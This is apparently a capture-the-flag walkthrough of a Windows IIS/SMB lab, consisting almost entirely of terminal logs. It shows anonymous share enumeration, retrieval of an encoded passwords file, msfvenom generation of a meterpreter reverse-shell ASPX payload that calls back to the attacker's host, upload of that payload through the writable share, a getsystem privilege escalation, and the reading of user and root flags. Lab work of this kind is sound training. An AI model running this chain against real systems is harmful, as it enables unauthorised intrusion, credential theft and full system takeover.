```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.113.152.36             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-28 04:45 EDT
Nmap scan report for 10.113.152.36
Host is up (0.24s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-07-27T08:27:51
|_Not valid after:  2027-01-26T08:27:51
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-07-28T08:45:59+00:00
|_ssl-date: 2026-07-28T08:46:38+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-28T01:46:02-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-28T08:46:00
|_  start_date: 2026-07-28T08:27:50
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.63 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.113.152.36
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.152.36 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.113.152.36/nt4wrksv         
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
```

```
smb: \> mget passwords.txt
Get file passwords.txt? y
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

```
┌──(kali㉿kali)-[~]
└─$ cat passwords.txt     
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                    
```

<img width="717" height="526" alt="image" src="https://github.com/user-attachments/assets/cb4736f5-b7db-49fb-a0f0-4d2fab7944c2" />

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.150  LPORT=4440 -f aspx > shell.aspx
```

```
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (5.0 kb/s) (average 5.0 kb/s)
smb: \> ls
  .                                   D        0  Tue Jul 28 05:02:58 2026
  ..                                  D        0  Tue Jul 28 05:02:58 2026
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  shell.aspx                          A     3668  Tue Jul 28 05:02:58 2026

                7735807 blocks of size 4096. 5100328 blocks available
```

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project
```

```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.170.150
lhost => 192.168.170.150
msf exploit(multi/handler) > set lport 4440
lport => 4440
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.170.150:4440
```
<img width="498" height="35" alt="image" src="https://github.com/user-attachments/assets/5bcc1e4f-fdd9-47c7-8360-2ea963336d61" />

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.170.150:4440 
[*] Sending stage (203846 bytes) to 10.113.152.36
[*] Meterpreter session 1 opened (192.168.170.150:4440 -> 10.113.152.36:50008) at 2026-07-28 05:18:23 -0400

meterpreter > shell
Process 3524 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

```
c:\windows\system32\inetsrv>cd /
cd /
c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\

07/28/2026  01:32 AM    <DIR>          badr
07/25/2020  08:16 AM    <DIR>          inetpub
07/25/2020  08:42 AM    <DIR>          Microsoft
07/16/2016  06:23 AM    <DIR>          PerfLogs
07/25/2020  08:00 AM    <DIR>          Program Files
07/25/2020  04:15 PM    <DIR>          Program Files (x86)
07/25/2020  02:03 PM    <DIR>          Users
07/25/2020  04:16 PM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  20,891,803,648 bytes free

c:\>cd users
cd users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          .NET v4.5
07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  10:30 AM    <DIR>          Administrator
07/25/2020  02:03 PM    <DIR>          Bob
07/25/2020  07:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  20,891,803,648 bytes free

c:\Users>cd bob
cd bob

c:\Users\Bob>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  02:04 PM    <DIR>          Desktop
               0 File(s)              0 bytes
               3 Dir(s)  20,891,803,648 bytes free

c:\Users\Bob>cd desktop
cd desktop

c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,891,803,648 bytes free

c:\Users\Bob\Desktop>more user.txt
more user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > cd c:/users
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2020-07-25 11:05:52 -0400  .NET v4.5
040777/rwxrwxrwx  0     dir   2020-07-25 11:05:49 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  0     dir   2020-07-25 13:30:12 -0400  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  All Users
040777/rwxrwxrwx  0     dir   2020-07-25 17:03:44 -0400  Bob
040555/r-xr-xr-x  0     dir   2020-07-25 13:55:45 -0400  Default
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  Default User
040555/r-xr-xr-x  0     dir   2020-07-25 10:58:09 -0400  Public
100666/rw-rw-rw-  174   fil   2016-07-16 09:21:29 -0400  desktop.ini
```
```
meterpreter > cd administrator
meterpreter > ls
Listing: c:\users\administrator
===============================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  AppData
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Application Data
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Contacts
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Cookies
040555/r-xr-xr-x  0        dir   2020-07-25 11:24:53 -0400  Desktop
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Documents
040555/r-xr-xr-x  0        dir   2020-07-25 11:39:19 -0400  Downloads
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Favorites
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:10 -0400  Links
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Local Settings
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Music
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  My Documents
100666/rw-rw-rw-  786432   fil   2020-07-25 17:46:20 -0400  NTUSER.DAT
100666/rw-rw-rw-  1048576  fil   2020-07-25 13:30:12 -0400  NTUSER.DAT{4d4dcbf6-cea8-11ea-825c-b66f413e232d}.TxR.0
                                                            .regtrans-ms
100666/rw-rw-rw-  1048576  fil   2020-07-25 13:30:12 -0400  NTUSER.DAT{4d4dcbf6-cea8-11ea-825c-b66f413e232d}.TxR.1
                                                            .regtrans-ms
100666/rw-rw-rw-  1048576  fil   2020-07-25 13:30:12 -0400  NTUSER.DAT{4d4dcbf6-cea8-11ea-825c-b66f413e232d}.TxR.2
                                                            .regtrans-ms
100666/rw-rw-rw-  65536    fil   2020-07-25 13:30:12 -0400  NTUSER.DAT{4d4dcbf6-cea8-11ea-825c-b66f413e232d}.TxR.b
                                                            lf
100666/rw-rw-rw-  65536    fil   2020-07-25 11:01:02 -0400  NTUSER.DAT{4d4dcbf7-cea8-11ea-825c-b66f413e232d}.TM.bl
                                                            f
100666/rw-rw-rw-  524288   fil   2020-07-25 11:01:02 -0400  NTUSER.DAT{4d4dcbf7-cea8-11ea-825c-b66f413e232d}.TMCon
                                                            tainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2020-07-25 11:01:02 -0400  NTUSER.DAT{4d4dcbf7-cea8-11ea-825c-b66f413e232d}.TMCon
                                                            tainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  NetHood
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Pictures
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  PrintHood
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Recent
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Saved Games
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:10 -0400  Searches
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  SendTo
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Start Menu
040777/rwxrwxrwx  0        dir   2020-07-25 10:57:31 -0400  Templates
040555/r-xr-xr-x  0        dir   2020-07-25 10:58:09 -0400  Videos
100666/rw-rw-rw-  211968   fil   2020-07-25 10:57:31 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  0        fil   2020-07-25 10:57:31 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2020-07-25 10:57:31 -0400  ntuser.ini
```
```
meterpreter > cd desktop
meterpreter > ls
Listing: c:\users\administrator\desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-07-25 10:58:09 -0400  desktop.ini
100666/rw-rw-rw-  35    fil   2020-07-25 11:25:02 -0400  root.txt

meterpreter > more root.txt
[-] Unknown command: more. Run the help command for more details.
meterpreter > cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
